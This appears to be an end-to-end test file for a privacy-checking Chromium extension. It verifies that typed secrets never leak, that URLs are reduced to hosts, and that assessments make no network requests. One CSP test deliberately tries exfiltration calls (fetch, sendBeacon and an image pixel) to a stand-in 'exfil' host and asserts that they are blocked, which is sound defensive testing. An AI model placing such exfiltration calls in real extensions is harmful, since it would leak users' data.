/**
 * End-to-end tests of the Chromium extension against local fixture sites.
 *
 * Verifies, in a real browser:
 *  1. the collector + engine produce an explainable assessment;
 *  2. typed form values (including a password) never appear in the snapshot,
 *     the assessment or the rendered popup;
 *  3. URL paths and query strings are reduced to hosts;
 *  4. the assessment causes ZERO new network requests;
 *  5. the extension CSP blocks network access from extension pages;
 *  6. privacy-policy text is reduced to claim flags.
 *
 * Requires Playwright with Chromium (pre-installed in the development
 * container). If unavailable, tests are skipped with an explanation.
 */
import { after, before, describe, test } from 'node:test';
import assert from 'node:assert/strict';
import { existsSync } from 'node:fs';
import { EXTENSION_DIR, launch, loadPlaywright, startProxy } from './harness.mjs';

const SECRET_PASSWORD = 'CorrectHorse-SECRET-9f3b';
const SECRET_EMAIL = 'secret.person.5521@example.com';
const SECRET_SEARCH = 'SECRET-SEARCH-TERM-cancer-diagnosis';
const SHOP = 'http://shop.plaster-fixture.test/';

const playwright = loadPlaywright();
const skip = !playwright ? 'Playwright is not installed (see README: Running the integration tests)' : !existsSync(EXTENSION_DIR) ? 'Run `npm run test:integration` (it builds the test extension first)' : false;

describe('Chromium extension (integration)', { skip }, () => {
  let proxy, browser, shop, popup;

  before(async () => {
    proxy = await startProxy();
    browser = await launch(playwright, proxy.port);
    shop = await browser.context.newPage();
    await shop.goto(SHOP, { waitUntil: 'load' });
    // The user types personal data into the page BEFORE the assessment.
    await shop.fill('#email', SECRET_EMAIL);
    await shop.fill('#pw', SECRET_PASSWORD);
    await shop.fill('#search', SECRET_SEARCH);
    popup = await browser.context.newPage();
    await popup.goto(`chrome-extension://${browser.extensionId}/popup.html`);
  });

  after(async () => {
    await browser?.close();
    await proxy?.close();
  });

  /** Run an assessment of the tab whose URL starts with `url`, from the popup page. */
  async function assessFromPopup(url) {
    return popup.evaluate(async (u) => {
      const tabs = await chrome.tabs.query({});
      const tab = tabs.find((t) => t.url?.startsWith(u));
      return globalThis.__plasterTest.assessTab(tab.id, tab.url);
    }, url);
  }

  test('the extension is installed with only activeTab + scripting (plus the test-only fixture host)', async () => {
    const manifest = await popup.evaluate(() => chrome.runtime.getManifest());
    assert.deepEqual(manifest.permissions, ['activeTab', 'scripting']);
    assert.deepEqual(manifest.host_permissions, ['http://*.plaster-fixture.test/*']);
    assert.equal(manifest.optional_permissions, undefined);
  });

  test('produces an explainable assessment of the fixture shop', async () => {
    const r = await assessFromPopup(SHOP);
    assert.equal(r.kind, 'assessed', r.reason);
    const a = r.assessment;
    // HTTP page with a password field: hard cap.
    assert.equal(a.grade, 'F');
    assert.ok(a.caps.some((c) => c.checkId === 'transport.secure-form-submission' && c.maxGrade === 'F'));
    // Third parties identified from Resource Timing, classified with cached knowledge.
    const domains = a.thirdPartyDomains.map((d) => d.domain);
    for (const d of ['hotjar.com', 'facebook.net', 'google-analytics.com', 'unlisted-vendor.example']) assert.ok(domains.includes(d), `expected ${d} in ${domains}`);
    assert.equal(a.thirdPartyDomains.find((d) => d.domain === 'hotjar.com').tracker.owner, 'Hotjar (Contentsquare)');
    assert.equal(a.thirdPartyDomains.find((d) => d.domain === 'unlisted-vendor.example').tracker, undefined);
    // Forms classified structurally.
    assert.deepEqual(r.snapshot.forms.map((f) => f.fieldKinds), [['email', 'password'], ['paymentCard', 'name'], ['other']]);
    assert.equal(r.snapshot.forms[0].actionOrigin, null, 'no action attribute => destination unknown, not "same site"');
    assert.equal(r.snapshot.forms[1].actionOrigin, 'https://payments.pay-provider.example');
    // Honest capability reporting.
    assert.equal(r.snapshot.capabilities.signals.cookies, 'unavailable');
    assert.equal(r.snapshot.capabilities.signals.subresourceHosts, 'partial');
    assert.equal(a.categories.find((c) => c.id === 'cookies').status, 'insufficient-evidence');
    // Guidance.
    const pw = a.guidance.find((g) => g.dataType === 'password');
    assert.equal(pw.level, 'avoid');
    assert.equal(pw.requestedOnPage, true);
  });

  test('PRIVACY: typed form values never appear in the snapshot, assessment or popup UI', async () => {
    const r = await assessFromPopup(SHOP);
    const serialised = JSON.stringify(r);
    for (const secret of [SECRET_PASSWORD, SECRET_EMAIL, SECRET_SEARCH]) {
      assert.ok(!serialised.includes(secret), `secret leaked into assessment: ${secret}`);
    }
    const tab = (await popup.evaluate(async () => (await chrome.tabs.query({})).find((t) => t.url?.startsWith('http://shop.'))))
    await popup.evaluate(({ id, url }) => globalThis.__plasterTest.run(id, url), { id: tab.id, url: tab.url });
    const uiText = await popup.locator('body').innerText();
    assert.match(uiText, /What Plaster could not see/i);
    for (const secret of [SECRET_PASSWORD, SECRET_EMAIL, SECRET_SEARCH]) assert.ok(!uiText.includes(secret));
    assert.equal(await shop.inputValue('#pw'), SECRET_PASSWORD, 'the page itself is unaffected');
  });

  test('PRIVACY: URL paths and query strings are reduced to hosts', async () => {
    const r = await assessFromPopup(SHOP);
    const serialised = JSON.stringify(r);
    assert.ok(!serialised.includes('QUERY-STRING-IDENTIFIER-42'));
    assert.ok(!serialised.includes('/collect'));
    assert.ok(!serialised.includes('fbevents.js'));
    assert.equal(r.snapshot.page.origin, 'http://shop.plaster-fixture.test');
  });

  test('LOCAL-FIRST: an assessment causes zero network requests', async () => {
    await shop.waitForLoadState('networkidle');
    const tabRequests = [];
    const popupRequests = [];
    const onTab = (req) => tabRequests.push(req.url());
    const onPopup = (req) => popupRequests.push(req.url());
    shop.on('request', onTab);
    popup.on('request', onPopup);
    const proxyBefore = proxy.log.length;

    const r = await assessFromPopup(SHOP);
    assert.equal(r.kind, 'assessed');
    await popup.waitForTimeout(500); // allow any (unexpected) asynchronous request to surface

    shop.off('request', onTab);
    popup.off('request', onPopup);
    const proxyDuring = proxy.log.slice(proxyBefore);
    assert.deepEqual(tabRequests, [], 'the collector must not cause requests from the page');
    assert.deepEqual(popupRequests, [], 'the popup must not make requests');
    // Chromium's own background services (e.g. accounts.google.com) are not
    // Plaster's; anything touching fixture or tracker hosts would be.
    const attributable = proxyDuring.filter((e) => !/(^|\.)(google\.com|googleapis\.com|gvt1\.com|gstatic\.com):443$/.test(e.host));
    assert.deepEqual(attributable, [], `unexpected network activity: ${JSON.stringify(attributable)}`);
  });

  test('LOCAL-FIRST: the extension CSP blocks network requests from extension pages', async () => {
    const before = proxy.log.length;
    const result = await popup.evaluate(async () => {
      const attempts = {};
      try { await fetch('http://exfil.plaster-fixture.test/steal'); attempts.fetch = 'allowed'; } catch { attempts.fetch = 'blocked'; }
      attempts.beacon = navigator.sendBeacon('http://exfil.plaster-fixture.test/beacon', 'x') ? 'queued' : 'blocked';
      await new Promise((resolve) => {
        const img = new Image();
        img.onload = () => { attempts.image = 'allowed'; resolve(); };
        img.onerror = () => { attempts.image = 'blocked'; resolve(); };
        img.src = 'http://exfil.plaster-fixture.test/pixel.gif';
      });
      return attempts;
    });
    await popup.waitForTimeout(1000);
    assert.equal(result.fetch, 'blocked');
    assert.equal(result.image, 'blocked');
    // NOTE: sendBeacon() returns true ("queued") even when CSP will block it, so
    // the meaningful assertion is that nothing reached the network.
    assert.equal(proxy.log.slice(before).filter((e) => e.host.includes('exfil')).length, 0, 'no exfiltration request (fetch, beacon or image) reached the network');
  });

  test('DISCLOSURES: privacy-policy text is reduced to claim flags; vague wording is not treated as DP', async () => {
    await shop.goto(`${SHOP}privacy`, { waitUntil: 'load' });
    const r = await assessFromPopup(`${SHOP}privacy`);
    assert.equal(r.kind, 'assessed');
    assert.deepEqual(r.snapshot.disclosures[0].claims.sort(), [
      'differential-privacy-mechanism', 'differential-privacy-mentioned', 'differential-privacy-parameters', 'vague-anonymisation',
    ]);
    assert.equal(r.assessment.pet.level, 4);
    assert.equal(r.assessment.pet.scoreEffect, 0);
    assert.ok(!JSON.stringify(r).includes('UNIQUE-POLICY-SENTENCE-7731'), 'policy text must not be retained');
  });

  test('REVIEW: text the user types (contenteditable, textarea) cannot influence policy claims', async () => {
    await shop.goto(`${SHOP}privacy-comments`, { waitUntil: 'load' });
    const typed = 'Our data is differentially private: Laplace noise with epsilon = 2 TYPED-BY-USER';
    await shop.click('#comment');
    await shop.keyboard.type(typed);
    await shop.fill('#reply', typed);
    const r = await assessFromPopup(`${SHOP}privacy-comments`);
    assert.equal(r.kind, 'assessed');
    assert.equal(r.snapshot.capabilities.signals.disclosures, 'partial', 'page is recognised as a policy page');
    assert.deepEqual(r.snapshot.disclosures[0].claims, [], 'user-typed text must not create claims');
    assert.equal(r.assessment.pet.level, 0);
    assert.ok(!JSON.stringify(r).includes('TYPED-BY-USER'));
  });

  test('LOCAL-FIRST: the policy-page path (which reads page text) also causes zero network requests', async () => {
    await shop.goto(`${SHOP}privacy`, { waitUntil: 'networkidle' });
    const requests = [];
    const onReq = (req) => requests.push(req.url());
    shop.on('request', onReq);
    popup.on('request', onReq);
    const before = proxy.log.length;
    const r = await assessFromPopup(`${SHOP}privacy`);
    await popup.waitForTimeout(500);
    shop.off('request', onReq);
    popup.off('request', onReq);
    assert.equal(r.kind, 'assessed');
    assert.deepEqual(requests, []);
    const attributable = proxy.log.slice(before).filter((e) => !/(^|\.)(google\.com|googleapis\.com|gvt1\.com|gstatic\.com):443$/.test(e.host));
    assert.deepEqual(attributable, []);
  });
});
